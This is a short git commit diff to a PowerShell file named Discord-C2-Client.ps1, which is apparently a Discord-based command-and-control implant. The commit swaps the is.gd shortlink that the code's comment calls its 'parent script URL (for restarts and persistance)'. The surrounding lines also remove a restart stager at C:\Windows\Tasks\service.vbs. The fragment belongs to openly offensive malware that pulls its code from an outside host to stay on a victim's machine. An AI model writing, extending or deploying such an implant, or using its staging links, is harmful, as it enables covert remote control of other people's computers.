03750ca727630690fbbbd7788b88de08619c9521
BenzoXdev <localtonet312@gmail.com>
2025-12-06 16:51:50 -0200

    Update Discord-C2-Client.ps1

--- Discord-C2-Client.ps1
+++ Discord-C2-Client.ps1
@@ -40,7 +40,7 @@ if ($auto -eq 'n') {
     $defaultstart = 0 
 }
 
-$global:parent = "is.gd/fPSP3B" # parent script URL (for restarts and persistance)
+$global:parent = "is.gd/qv6G96" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if (Test-Path "C:\Windows\Tasks\service.vbs") {
